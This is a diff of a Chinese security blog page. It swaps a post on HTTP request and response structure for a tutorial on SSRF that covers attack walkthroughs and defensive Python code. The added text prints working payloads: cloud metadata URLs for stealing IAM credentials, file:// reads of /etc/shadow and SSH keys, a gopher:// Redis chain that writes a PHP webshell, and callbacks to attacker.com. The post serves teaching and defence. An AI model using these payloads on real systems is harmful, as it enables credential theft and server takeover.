@@ -4,8 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="HTTP 请求响应全景：从协议结构看 Web 攻击的本质, 是小竹不是小猪">
-    <meta name="description" content="引言：为什么要从协议层理解攻击XSS、CSRF、文件上传是 Web 安全中最常见的三类漏洞。表面上看它们各不相同——XSS 是脚本注入，CSRF 是请求伪造，文件上传是恶意文件写入。但如果回到 HTTP 协议层面，会发现它们攻击的是同一条通">
+    <meta name="keywords" content="SSRF 服务端请求伪造：原理、攻击与防御, 是小竹不是小猪">
+    <meta name="description" content="一、核心原理SSRF（Server-Side Request Forgery，服务端请求伪造）的本质是攻击者让服务端代替自己向任意地址发起网络请求。
+与 CSRF 形成对称：CSRF 是借用户的浏览器向目标站发请求（攻击发生在客户端），SS">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>HTTP 请求响应全景：从协议结构看 Web 攻击的本质 | 是小竹不是小猪</title>
+    <title>SSRF 服务端请求伪造：原理、攻击与防御 | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -309,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">HTTP 请求响应全景：从协议结构看 Web 攻击的本质</h1>
+                    <h1 class="description center-align post-title">SSRF 服务端请求伪造：原理、攻击与防御</h1>
                 </div>
             </div>
         </div>
@@ -438,8 +439,8 @@
                                 <span class="chip bg-color">Web安全</span>
                             </a>
                         
-                            <a href="/tags/HTTP/">
-                                <span class="chip bg-color">HTTP</span>
+                            <a href="/tags/SSRF/">
+                                <span class="chip bg-color">SSRF</span>
                             </a>
                         
                     </div>
@@ -454,7 +455,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2026-08-07
+                    2026-08-08
                 </div>
                 
 
@@ -475,229 +476,358 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="引言：为什么要从协议层理解攻击"><a href="#引言：为什么要从协议层理解攻击" class="headerlink" title="引言：为什么要从协议层理解攻击"></a>引言：为什么要从协议层理解攻击</h3><p>XSS、CSRF、文件上传是 Web 安全中最常见的三类漏洞。表面上看它们各不相同——XSS 是脚本注入，CSRF 是请求伪造，文件上传是恶意文件写入。但如果回到 HTTP 协议层面，会发现它们攻击的是同一条通信链路的不同环节。</p>
-<p>一条完整的 Web 交互包含两部分：客户端发给服务端的请求（Request），和服务端返回给客户端的响应（Response）。请求中有方法、URL、请求头、请求体；响应中有状态码、响应头、响应体。每一部分都可能成为攻击面。</p>
-<p>本文先完整拆解请求和响应的每一个组成部分，然后将 XSS、CSRF、文件上传三种攻击映射到这条链路上，最后分析它们之间的关联和各自的防御侧重。</p>
+                <h3 id="一、核心原理"><a href="#一、核心原理" class="headerlink" title="一、核心原理"></a>一、核心原理</h3><p>SSRF（Server-Side Request Forgery，服务端请求伪造）的本质是<strong>攻击者让服务端代替自己向任意地址发起网络请求</strong>。</p>
+<p>与 CSRF 形成对称：CSRF 是借用户的浏览器向目标站发请求（攻击发生在客户端），SSRF 是借服务端的网络能力向内网或本地服务发请求（攻击发生在服务端）。</p>
+<pre><code>CSRF：攻击者 → 用户浏览器 → 目标站
+SSRF：攻击者 → 目标服务端 → 内网服务 / 云服务元数据 / 本地文件
+</code></pre>
+<p>理解 SSRF 需要抓住一个前提：很多 Web 应用有”代替用户去请求其他地址”的功能——图片加载（用户输入一个图片 URL，服务端下载后展示）、文件导入（用户提供一个远程文件地址，服务端拉取解析）、链接预览（用户贴一个链接，服务端抓取标题和摘要）、Webhook 回调（用户注册一个回调 URL，服务端在事件触发时通知）。</p>
+<p>这些功能的共同点是：服务端接受一个 URL 参数，然后主动发起 HTTP 请求。如果服务端没有校验这个 URL 的目标地址，攻击者就可以让它请求内网 IP、本地端口、云元数据接口——这些地址从外部网络是不可达的，但服务端在内网中，天然可以访问。</p>
+<p>一个完整的 SSRF 攻击需要满足两个条件：第一，应用有从用户输入中接受 URL 并发起请求的功能。第二，服务端没有对 URL 的目标地址做有效校验（如白名单、协议限制、内网 IP 过滤）。</p>
 <hr>
-<h3 id="一、HTTP-请求的完整结构"><a href="#一、HTTP-请求的完整结构" class="headerlink" title="一、HTTP 请求的完整结构"></a>一、HTTP 请求的完整结构</h3><p>一个 HTTP 请求由四部分组成：请求行、请求头、请求体、以及底层 TCP/TLS 连接。攻击面分布在这四层的每一个字段中。</p>
-<h4 id="1-1-请求行"><a href="#1-1-请求行" class="headerlink" title="1.1 请求行"></a>1.1 请求行</h4><pre><code>POST /api/transfer HTTP/1.1
-│      │            │
-│      │            └── 协议版本
-│      └── URL 路径（含查询参数）
-└── HTTP 方法
+<h3 id="二、四种-SSRF-完整攻击实例"><a href="#二、四种-SSRF-完整攻击实例" class="headerlink" title="二、四种 SSRF 完整攻击实例"></a>二、四种 SSRF 完整攻击实例</h3><h4 id="2-1-基础-SSRF：探测和访问内网服务"><a href="#2-1-基础-SSRF：探测和访问内网服务" class="headerlink" title="2.1 基础 SSRF：探测和访问内网服务"></a>2.1 基础 SSRF：探测和访问内网服务</h4><p><strong>场景：</strong> 一个在线头像功能，用户输入图片 URL，服务端下载图片后裁剪为头像。</p>
+<pre><code>https://app.com/api/avatar?url=https://example.com/photo.jpg
 </code></pre>
-<p><strong>方法（Method）：</strong> GET、POST、PUT、DELETE 等。方法决定了服务端如何处理这个请求，也决定了攻击者能做什么。</p>
-<p>GET 请求的参数在 URL 中，可以被 <code>&lt;img src&gt;</code>、<code>&lt;link href&gt;</code>、<code>&lt;a href&gt;</code> 等标签直接触发。这就是 GET 型 CSRF 的基础——攻击者不需要 JS，一个 HTML 标签就能发出请求。</p>
-<p>POST 请求的参数在请求体中，需要 <code>&lt;form&gt;</code> 表单或 JS 才能构造。这提高了 CSRF 的攻击门槛，但并没有根本阻止。</p>
-<p><strong>URL 路径和查询参数：</strong> <code>https://bank.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-<p>URL 中的查询参数（<code>?q=xxx</code>）是反射型 XSS 最常见的注入点。服务端从 URL 中取出参数值，未经转义拼入 HTML 响应，浏览器解析时执行注入的脚本。</p>
-<p>URL 路径本身也可能成为注入点。<code>$_SERVER[&#39;PHP_SELF&#39;]</code> 包含当前 URL 路径，如果直接用于 <code>form action</code> 属性，路径部分可被注入：访问 <code>/page.php/&lt;script&gt;alert(1)&lt;/script&gt;</code>，<code>PHP_SELF</code> 的值为 <code>/page.php/&lt;script&gt;alert(1)&lt;/script&gt;</code>。</p>
-<h4 id="1-2-请求头"><a href="#1-2-请求头" class="headerlink" title="1.2 请求头"></a>1.2 请求头</h4><p>请求头是键值对，每行一个 <code>Key: Value</code>。以下是与安全直接相关的关键请求头：</p>
-<p><strong>Host：</strong> 指定目标主机。虚拟主机环境下，一个 IP 服务多个域名，服务端根据 Host 头决定路由。Host 头注入可能导致密码重置链接指向攻击者的服务器。</p>
-<p><strong>Content-Type：</strong> 告诉服务端请求体的格式。</p>
-<pre><code>Content-Type: application/x-www-form-urlencoded   ← 表单默认
-Content-Type: multipart/form-data; boundary=xxx    ← 文件上传
-Content-Type: application/json                      ← API 常用
-Content-Type: text/plain                            ← 纯文本
+<p><strong>第一步：确认攻击面。</strong> 攻击者注册账号，进入头像设置页面。输入一个外部图片 URL，服务端正常下载并返回裁剪后的图片。抓包确认服务端确实发起了 HTTP 请求去下载图片。</p>
+<p><strong>第二步：探测内网。</strong> 攻击者将 URL 改为内网地址：</p>
+<pre><code>https://app.com/api/avatar?url=http://192.168.1.1
 </code></pre>
-<p>文件上传攻击的入口就是 <code>multipart/form-data</code>。请求体按 boundary 分割为多个部分，每个部分有自己的 <code>Content-Disposition</code>（含文件名）和 <code>Content-Type</code>。这两个字段完全由客户端控制，服务端不能信任——这是文件上传安全问题的根源。</p>
-<p>CSRF 攻击中，Content-Type 也是一道天然屏障。HTML 表单只能发送 <code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code> 三种类型。如果服务端只接受 <code>application/json</code>，传统表单无法直接伪造。</p>
-<p><strong>Cookie：</strong> 浏览器自动携带目标域的 Cookie。这是 CSRF 攻击的核心——浏览器不区分请求是用户主动发起的还是被第三方页面诱导发出的，只要目标域有 Cookie 就自动带上。</p>
-<pre><code>Cookie: session_id=abc123; csrf_token=xxx
+<p>服务端向内网 <code>192.168.1.1</code> 发起 HTTP 请求。如果返回了内容（哪怕是一个错误页面），说明 SSRF 存在。攻击者通过响应时间、状态码、响应内容判断内网中有哪些主机和端口是开放的。</p>
+<p><strong>第三步：访问内网服务。</strong> 攻击者扫描到内网 <code>192.168.1.100:6379</code> 运行着 Redis（默认不设置密码），直接通过 SSRF 发送 Redis 命令：</p>
+<pre><code>https://app.com/api/avatar?url=http://192.168.1.100:6379/
 </code></pre>
-<p>如果 Cookie 没有设置 <code>SameSite</code> 属性，跨站请求也会携带。如果设置了 <code>HttpOnly</code>，JavaScript 无法读取（降低 XSS 窃取 Cookie 的风险）。如果设置了 <code>Secure</code>，只通过 HTTPS 传输。</p>
-<p><strong>Origin / Referer：</strong> 标识请求来源。</p>
-<pre><code>Origin: https://attacker.com
-Referer: https://attacker.com/page?id=1
+<p>如果服务端使用的是简单的 HTTP 客户端（如 Python 的 <code>requests.get(url)</code>），请求会被发送到 Redis。Redis 是文本协议，会尝试解析 HTTP 请求的内容，虽然大部分会报错，但攻击者可以利用 <code>gopher://</code> 协议构造精确的 Redis 命令（见 2.3）。</p>
+<p><strong>完整数据流：</strong></p>
+<pre><code>攻击者提交 url=http://192.168.1.100:6379
+  → 服务端接受 URL，发起 HTTP 请求到 192.168.1.100:6379
+  → 请求到达内网 Redis 服务
+  → Redis 收到非标准请求，返回错误信息
+  → 服务端将错误信息（或响应内容）返回给攻击者
+  → 攻击者确认内网 Redis 存在
 </code></pre>
-<p>Origin 只在跨域 POST 中发送，格式为 <code>scheme://host:port</code>（不含路径）。Referer 在所有请求中发送，包含完整 URL。服务端可以用它们校验请求来源是否合法，但这两个头也可能被隐私插件剥离。</p>
-<p>CORS 机制中，浏览器发送的 <code>Origin</code> 头和服务端返回的 <code>Access-Control-Allow-Origin</code> 响应头共同决定了跨域请求是否被允许。如果服务端动态反射 Origin（把请求的 Origin 原样返回），等于对所有域开放 CORS。</p>
-<p><strong>自定义安全头：</strong></p>
-<pre><code>X-Requested-With: XMLHttpRequest
-X-CSRF-Token: rAnd0mV4lu3
+<p><strong>为什么这能成功？</strong> 因为服务端在内网中，天然可以访问内网地址。攻击者从外部网络无法直接访问 <code>192.168.1.100</code>，但服务端可以。SSRF 就是借服务端的网络位置做跳板。</p>
+<h4 id="2-2-云元数据攻击：窃取云凭证"><a href="#2-2-云元数据攻击：窃取云凭证" class="headerlink" title="2.2 云元数据攻击：窃取云凭证"></a>2.2 云元数据攻击：窃取云凭证</h4><p><strong>场景：</strong> 应用部署在 AWS/阿里云/腾讯云等云平台上，同样有图片加载功能。</p>
+<p><strong>第一步：确认云环境。</strong> 攻击者尝试访问云平台的元数据服务地址：</p>
+<pre><code>https://app.com/api/avatar?url=http://169.254.169.254/latest/meta-data/
 </code></pre>
-<p>服务端可以用自定义头做 CSRF 校验——HTML 表单和 <code>&lt;img&gt;</code> 标签无法设置自定义头，所以要求必须有自定义头就能挡住传统 CSRF 手段。但这只挡住了不会 JS 的攻击者，<code>fetch</code> 可以设置任意自定义头，此时需要配合 CORS 策略兜底。</p>
-<h4 id="1-3-请求体"><a href="#1-3-请求体" class="headerlink" title="1.3 请求体"></a>1.3 请求体</h4><p>请求体是请求的实际数据载荷。根据 Content-Type 不同，格式不同：</p>
-<p><strong>表单编码（application/x-www-form-urlencoded）：</strong></p>
-<pre><code>username=admin&amp;password=123&amp;redirect=%2Fdashboard
-</code></pre>
-<p>键值对用 <code>&amp;</code> 分隔，特殊字符做 URL 编码。这是最传统的请求体格式，也是 CSRF 表单攻击的标准格式。</p>
-<p><strong>JSON（application/json）：</strong></p>
-<pre><code class="json">&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123&quot;, &quot;role&quot;: &quot;user&quot;&#125;
-</code></pre>
-<p>现代 API 的标准格式。JSON 格式对 CSRF 有一定天然防护（表单无法直接发送 JSON），但如果 CORS 配置错误，<code>fetch</code> 可以绕过。</p>
-<p><strong>Multipart（multipart/form-data）：</strong></p>
-<pre><code>------WebKitFormBoundary
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;
-Content-Type: application/x-php
+<p><code>169.254.169.254</code> 是 AWS/阿里云等云平台提供的链路本地地址（link-local），只有从云实例内部才能访问。它提供当前实例的元数据，包括 IAM 角色凭证。</p>
+<p><strong>第二步：获取 IAM 凭证。</strong> 如果 SSRF 存在，服务端向元数据服务发起请求，返回实例的元数据。攻击者逐步深入：</p>
+<pre><code># 获取 IAM 角色名
+https://app.com/api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+→ 返回: app-server-role
 
-&lt;?php phpinfo(); ?&gt;
-------WebKitFormBoundary--
+# 获取该角色的临时凭证
+https://app.com/api/avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-server-role
+→ 返回:
+&#123;
+  &quot;AccessKeyId&quot;: &quot;ASIA...&quot;,
+  &quot;SecretAccessKey&quot;: &quot;wJalr...&quot;,
+  &quot;Token&quot;: &quot;FwoGZXIvY...&quot;,
+  &quot;Expiration&quot;: &quot;2026-08-08T12:00:00Z&quot;
+&#125;
 </code></pre>
-<p>文件上传的专用格式。<code>filename</code> 和每部分的 <code>Content-Type</code> 完全由客户端控制。攻击面包括：文件名注入（路径穿越、SQL 注入、命令注入）、文件类型伪造（扩展名、MIME、Magic Number）、文件内容（WebShell、图片马、SVG XSS）。</p>
-<h4 id="1-4-底层连接"><a href="#1-4-底层连接" class="headerlink" title="1.4 底层连接"></a>1.4 底层连接</h4><p>HTTP 运行在 TCP/TLS 之上。TLS 保证传输加密，但如果证书校验不严（如客户端禁用证书校验），中间人可以截获和篡改请求内容。</p>
+<p><strong>第三步：利用凭证。</strong> 攻击者拿到 AK/SK/Token 后，用 AWS CLI 或 SDK 以该角色的权限操作云资源——读取 S3 桶中的文件、操作 RDS 数据库、启动新的 EC2 实例。</p>
+<p><strong>完整数据流：</strong></p>
+<pre><code>攻击者提交 url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role
+  → 服务端发起 HTTP 请求到 169.254.169.254
+  → 云平台元数据服务返回 IAM 临时凭证（AK/SK/Token）
+  → 服务端将凭证内容返回给攻击者
+  → 攻击者用凭证调用 AWS API，接管云资源
+</code></pre>
+<p><strong>为什么这特别危险？</strong> 因为云凭证的权限通常很大（读写 S3、操作数据库、管理其他实例），而且临时凭证的有效期通常是几小时到几天。一次 SSRF 可能导致整个云环境被接管。</p>
+<p><strong>AWS 的防御措施：</strong> 2019 年后 AWS 推出了 IMDSv2，要求用 PUT 请求获取 session token，然后用 token 去获取元数据。简单的 HTTP GET 请求（SSRF 常用的方式）无法直接获取元数据。但如果 SSRF 支持 PUT 方法或使用 <code>gopher://</code> 协议，IMDSv2 仍可被绕过。</p>
+<h4 id="2-3-协议利用：gopher-dict-file-协议攻击内网"><a href="#2-3-协议利用：gopher-dict-file-协议攻击内网" class="headerlink" title="2.3 协议利用：gopher/dict/file 协议攻击内网"></a>2.3 协议利用：gopher/dict/file 协议攻击内网</h4><p><strong>场景：</strong> 服务端的 URL 解析不仅支持 <code>http://</code>，还支持其他协议（<code>file://</code>、<code>dict://</code>、<code>gopher://</code>、<code>ldap://</code>）。</p>
+<p><strong>第一步：读取本地文件。</strong> 如果服务端支持 <code>file://</code> 协议：</p>
+<pre><code>https://app.com/api/avatar?url=file:///etc/passwd
+</code></pre>
+<p>服务端读取本地文件 <code>/etc/passwd</code> 的内容，作为”图片数据”返回给攻击者。攻击者可以读取配置文件、密钥文件、源代码：</p>
+<pre><code>file:///etc/passwd
+file:///etc/shadow（需要权限）
+file:///root/.ssh/id_rsa
+file:///var/www/html/config.php
+file:///proc/self/environ（环境变量，可能包含数据库密码）
+</code></pre>
+<p><strong>第二步：用 gopher 协议精确构造请求。</strong> <code>gopher://</code> 是最危险的协议，因为它可以向任意端口发送任意 TCP 数据。攻击者可以用它精确构造对内网服务的请求：</p>
+<pre><code># gopher:// 格式：gopher://host:port/原始TCP数据
+
+# 攻击内网 Redis，写入 WebShell
+gopher://192.168.1.100:6379/%0D%0A
+  CONFIG SET dir /var/www/html%0D%0A
+  CONFIG SET dbfilename shell.php%0D%0A
+  SET x &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;%0D%0A
+  SAVE%0D%0A
+</code></pre>
+<p>URL 编码后的 <code>%0D%0A</code> 是 <code>\r\n</code>（CRLF），gopher 协议会将这些原始数据直接发送到 Redis 的 6379 端口。Redis 逐行解析命令，执行写入 WebShell 的操作。</p>
+<p><strong>第三步：攻击内网 MySQL。</strong> 类似地，用 gopher 协议构造 MySQL 认证和数据查询请求：</p>
+<pre><code>gopher://192.168.1.200:3306/%00...（MySQL 协议格式的认证和数据请求）
+</code></pre>
+<p><strong>完整数据流（gopher + Redis）：</strong></p>
+<pre><code>攻击者提交 url=gopher://192.168.1.100:6379/%0D%0A...
+  → 服务端 URL 解析器识别 gopher:// 协议
+  → 服务端向 192.168.1.100:6379 建立 TCP 连接
+  → 将 URL 中编码的原始数据解码后发送到 Redis
+  → Redis 执行 CONFIG SET + SET + SAVE 命令
+  → WebShell 被写入 /var/www/html/shell.php
+  → 攻击者访问 WebShell，获得服务器控制权
+</code></pre>
+<p><strong>为什么 gopher 最危险？</strong> 因为 HTTP 协议只能发 HTTP 请求，但内网中的很多服务（Redis、MySQL、Memcached、FastCGI）不识别 HTTP。gopher 协议允许发送任意 TCP 数据，等于给了攻击者一个通用的内网协议代理。</p>
+<p><strong>防御的关键：</strong> 限制服务端 URL 解析器支持的协议。大多数场景只需要 <code>http://</code> 和 <code>https://</code>，应该禁止 <code>file://</code>、<code>gopher://</code>、<code>dict://</code>、<code>ldap://</code> 等协议。</p>
+<h4 id="2-4-盲-SSRF：无回显但有影响"><a href="#2-4-盲-SSRF：无回显但有影响" class="headerlink" title="2.4 盲 SSRF：无回显但有影响"></a>2.4 盲 SSRF：无回显但有影响</h4><p><strong>场景：</strong> 服务端发起请求后不将响应内容返回给用户（如后台异步发送 Webhook 通知）。攻击者看不到服务端的响应，无法直接读取内网服务的数据。</p>
+<p><strong>第一步：确认盲 SSRF 存在。</strong> 攻击者注册一个 Webhook 回调 URL：</p>
+<pre><code>https://app.com/api/webhook?url=http://attacker.com/callback
+</code></pre>
+<p>服务端向 <code>attacker.com/callback</code> 发起请求。攻击者在自己的服务器上收到了请求，确认 SSRF 存在。</p>
+<p><strong>第二步：利用副作用。</strong> 虽然没有回显，但攻击者可以通过观察内网服务的行为变化来推断信息：</p>
+<p>端口扫描：将 URL 改为 <code>http://192.168.1.100:6379</code>，如果攻击者的回调很快收到响应（内网服务快速拒绝），说明端口开放；如果超时，说明端口关闭或被防火墙拦截。</p>
+<pre><code>url=http://192.168.1.100:6379   → 回调在 0.1s 后收到（端口开放，Redis 快速响应）
+url=http://192.168.1.100:9999   → 回调在 30s 后收到（端口关闭，连接超时）
+</code></pre>
+<p>触发内部操作：如果内网有一个管理接口 <code>http://192.168.1.50/admin/reset-all</code>，攻击者通过 SSRF 触发它，虽然看不到响应，但如果页面上所有用户的数据被重置了，就知道请求成功了。</p>
+<p><strong>DNS 外带：</strong> 如果 SSRF 支持 DNS 查询，攻击者可以让服务端解析一个攻击者控制的域名，通过 DNS 记录传递数据：</p>
+<pre><code>url=http://data.attacker.com/   ← 服务端向攻击者的 DNS 发起查询
+</code></pre>
+<p>攻击者在 DNS 日志中看到来自目标服务端 IP 的查询请求，确认 SSRF 存在，并获取了服务端的真实内网 IP。</p>
+<p><strong>完整数据流（盲 SSRF + 内部操作）：</strong></p>
+<pre><code>攻击者提交 url=http://192.168.1.50/admin/reset-all
+  → 服务端向 192.168.1.50 发起 HTTP GET 请求
+  → 内网管理接口执行重置操作
+  → 攻击者看不到响应内容
+  → 但攻击者观察到应用数据被重置 → 确认请求成功执行
+</code></pre>
+<p><strong>盲 SSRF 的难点：</strong> 攻击者无法直接读取内网数据，只能利用副作用（数据被修改、服务行为变化）来推断。但它的威胁仍然很大——如果内网有不需要认证就能触发操作的管理接口，盲 SSRF 就足够了。</p>
 <hr>
-<h3 id="二、HTTP-响应的完整结构"><a href="#二、HTTP-响应的完整结构" class="headerlink" title="二、HTTP 响应的完整结构"></a>二、HTTP 响应的完整结构</h3><p>服务端处理完请求后，返回一个 HTTP 响应。响应也由三部分组成：状态行、响应头、响应体。</p>
-<h4 id="2-1-状态行"><a href="#2-1-状态行" class="headerlink" title="2.1 状态行"></a>2.1 状态行</h4><pre><code>HTTP/1.1 200 OK
-│          │    │
-│          │    └── 状态描述
-│          └── 状态码
-└── 协议版本
+<h3 id="三、防御策略详解"><a href="#三、防御策略详解" class="headerlink" title="三、防御策略详解"></a>三、防御策略详解</h3><h4 id="3-1-URL-白名单：只允许请求预定义的安全域名"><a href="#3-1-URL-白名单：只允许请求预定义的安全域名" class="headerlink" title="3.1 URL 白名单：只允许请求预定义的安全域名"></a>3.1 URL 白名单：只允许请求预定义的安全域名</h4><p>最直接的防御：服务端只允许请求白名单中的域名，其他一律拒绝。</p>
+<pre><code class="python">ALLOWED_DOMAINS = &#123;&#39;images.example.com&#39;, &#39;cdn.example.com&#39;&#125;
+
+def fetch_url(url):
+    parsed = urlparse(url)
+    if parsed.hostname not in ALLOWED_DOMAINS:
+        raise ValueError(f&quot;Domain &#123;parsed.hostname&#125; not allowed&quot;)
+    return requests.get(url)
 </code></pre>
-<p>状态码本身一般不直接构成攻击面，但某些状态码与安全问题相关：302 重定向可能被利用做开放重定向（Open Redirect），403/404 页面的信息泄露可能暴露系统版本和路径。</p>
-<h4 id="2-2-响应头"><a href="#2-2-响应头" class="headerlink" title="2.2 响应头"></a>2.2 响应头</h4><p>响应头是服务端告诉浏览器”如何处理这个响应”的指令。以下是与安全直接相关的关键响应头：</p>
-<p><strong>Content-Type：</strong> 告诉浏览器响应的 MIME 类型。</p>
-<pre><code>Content-Type: text/html; charset=utf-8
-Content-Type: application/json
-Content-Type: image/jpeg
+<p><strong>为什么白名单最安全？</strong> 因为默认拒绝一切，只放行已知安全的地址。攻击者无论构造什么 URL，只要不在白名单中就会被拒绝。</p>
+<p><strong>白名单的常见绕过和注意事项：</strong></p>
+<p>域名解析绕过：攻击者注册 <code>evil.com</code>，将 <code>images.example.com.evil.com</code> 指向自己的服务器。如果白名单校验用 <code>endswith(&#39;example.com&#39;)</code>，这个域名会通过检查。正确做法是精确匹配或校验注册域。</p>
+<pre><code class="python"># 错误：endswith 可被绕过
+if parsed.hostname.endswith(&#39;example.com&#39;):  # images.example.com.evil.com 也通过
+    ...
+
+# 正确：精确匹配
+if parsed.hostname in ALLOWED_DOMAINS:
+    ...
+
+# 或者校验注册域
+import tldextract
+extracted = tldextract.extract(parsed.hostname)
+if extracted.registered_domain != &#39;example.com&#39;:
+    raise ValueError(&quot;Domain not allowed&quot;)
 </code></pre>
-<p>如果服务端返回 JSON 数据但 Content-Type 错误设置为 <code>text/html</code>，浏览器会把 JSON 当 HTML 解析。如果 JSON 中包含用户可控数据（如用户名），其中的 <code>&lt;script&gt;</code> 标签会被执行。这就是为什么 API 必须正确设置 <code>Content-Type: application/json</code>。</p>
-<p><strong>Content-Disposition：</strong> 告诉浏览器是内联显示还是作为附件下载。</p>
-<pre><code>Content-Disposition: inline                          ← 浏览器直接渲染
-Content-Disposition: attachment; filename=&quot;file.jpg&quot; ← 强制下载
+<p>DNS 重绑定攻击：攻击者设置 DNS 记录，第一次解析 <code>attacker.com</code> 返回合法 IP（通过白名单校验），第二次解析返回内网 IP（实际请求时）。两次 DNS 查询之间有时间差，白名单校验和实际请求使用的是不同的 IP。</p>
+<pre><code>第一次 DNS 查询（白名单校验时）：attacker.com → 1.2.3.4（合法 IP）→ 通过
+第二次 DNS 查询（实际发请求时）：attacker.com → 192.168.1.100（内网 IP）→ SSRF 成功
 </code></pre>
-<p>对于用户上传的文件，设置 <code>Content-Disposition: attachment</code> 可以阻止 SVG/HTML 文件的 XSS 执行——浏览器会下载而不是渲染它。</p>
-<p><strong>X-Content-Type-Options: nosniff：</strong> 阻止浏览器 MIME 嗅探。如果 Content-Type 设置错误，浏览器通常会”智能”检测实际内容类型并据此处理。<code>nosniff</code> 让浏览器严格按照声明的 Content-Type 处理，防止 JSON 被当 HTML 解析。</p>
-<p><strong>Content-Security-Policy（CSP）：</strong> 告诉浏览器哪些来源的脚本可以执行。</p>
-<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &#39;nonce-xxx&#39;; object-src &#39;none&#39;
+<p>防御 DNS 重绑定：白名单校验后，用校验得到的 IP 地址直接发起请求（不再做第二次 DNS 解析），或者设置 DNS 缓存让两次解析返回相同结果。</p>
+<pre><code class="python">import socket
+
+def safe_fetch(url):
+    parsed = urlparse(url)
+    # 解析域名得到 IP
+    ip = socket.gethostbyname(parsed.hostname)
+    # 校验 IP 不是内网地址
+    if is_internal_ip(ip):
+        raise ValueError(&quot;Internal IP not allowed&quot;)
+    # 用已解析的 IP 直接发起请求，避免 DNS 重绑定
+    new_url = url.replace(parsed.hostname, ip)
+    return requests.get(new_url)
 </code></pre>
-<p>CSP 是 XSS 防御的最后一道防线。即使页面中存在 XSS 注入点，CSP 禁止内联脚本后，大多数 payload 无法执行。</p>
-<p><strong>Set-Cookie：</strong> 服务端设置 Cookie。</p>
-<pre><code>Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+<h4 id="3-2-内网-IP-过滤：禁止请求私有地址"><a href="#3-2-内网-IP-过滤：禁止请求私有地址" class="headerlink" title="3.2 内网 IP 过滤：禁止请求私有地址"></a>3.2 内网 IP 过滤：禁止请求私有地址</h4><p>如果业务需要允许用户输入任意 URL（不能做域名白名单），至少要过滤内网 IP 地址：</p>
+<pre><code class="python">import ipaddress
+
+INTERNAL_NETWORKS = [
+    ipaddress.ip_network(&#39;10.0.0.0/8&#39;),
+    ipaddress.ip_network(&#39;172.16.0.0/12&#39;),
+    ipaddress.ip_network(&#39;192.168.0.0/16&#39;),
+    ipaddress.ip_network(&#39;127.0.0.0/8&#39;),
+    ipaddress.ip_network(&#39;169.254.0.0/16&#39;),  # 云元数据地址
+    ipaddress.ip_network(&#39;0.0.0.0/8&#39;),
+    ipaddress.ip_network(&#39;::1/128&#39;),           # IPv6 回环
+    ipaddress.ip_network(&#39;fc00::/7&#39;),          # IPv6 私有地址
+]
+
+def is_internal_ip(ip_str):
+    try:
+        ip = ipaddress.ip_address(ip_str)
+        return any(ip in network for network in INTERNAL_NETWORKS)
+    except ValueError:
+        return True  # 无法解析的 IP 一律拒绝
 </code></pre>
-<p><code>HttpOnly</code> 阻止 JS 读取 Cookie（防 XSS 窃取会话）。<code>Secure</code> 要求 HTTPS 传输（防中间人）。<code>SameSite</code> 控制跨站请求是否携带（防 CSRF）。这三个标志分别对应不同的攻击类型。</p>
-<p><strong>Access-Control-Allow-Origin / Allow-Credentials / Allow-Headers：</strong> CORS 响应头，控制哪些域可以跨域访问本资源。</p>
-<pre><code>Access-Control-Allow-Origin: https://mysite.com     ← 白名单（安全）
-Access-Control-Allow-Origin: *                       ← 所有域（危险）
-Access-Control-Allow-Credentials: true               ← 允许携带 Cookie
-Access-Control-Allow-Headers: X-CSRF-Token           ← 允许跨域带自定义头
+<p><strong>校验时机很关键：</strong> 必须在 DNS 解析之后、发起请求之前校验 IP。如果只校验 URL 中的域名（<code>if &#39;192.168&#39; in url</code>），攻击者用域名指向内网 IP 就能绕过。</p>
+<pre><code class="python">def safe_fetch(url):
+    parsed = urlparse(url)
+    # 先解析域名
+    ip = socket.gethostbyname(parsed.hostname)
+    # 校验解析后的 IP
+    if is_internal_ip(ip):
+        raise ValueError(&quot;Internal IP not allowed&quot;)
+    # 用校验过的 IP 发起请求
+    ...
 </code></pre>
-<p>如果 <code>Allow-Origin</code> 动态反射请求的 Origin，等于对所有域开放。配合 <code>Allow-Credentials: true</code>，攻击者可以在自己的页面上用 <code>fetch</code> 携带用户 Cookie 读取敏感数据，或绕过 CSRF Token。</p>
-<p><strong>X-Frame-Options: DENY：</strong> 阻止页面被 <code>&lt;iframe&gt;</code> 嵌入，防御点击劫持。</p>
-<h4 id="2-3-响应体"><a href="#2-3-响应体" class="headerlink" title="2.3 响应体"></a>2.3 响应体</h4><p>响应体是服务端返回的实际内容——HTML 页面、JSON 数据、图片、文件等。</p>
-<p><strong>HTML 响应体</strong> 是 XSS 的主战场。服务端将用户数据拼入 HTML 时，如果没有做输出编码，<code>&lt;script&gt;</code>、<code>onerror</code>、<code>javascript:</code> 等可执行内容会被浏览器解析执行。</p>
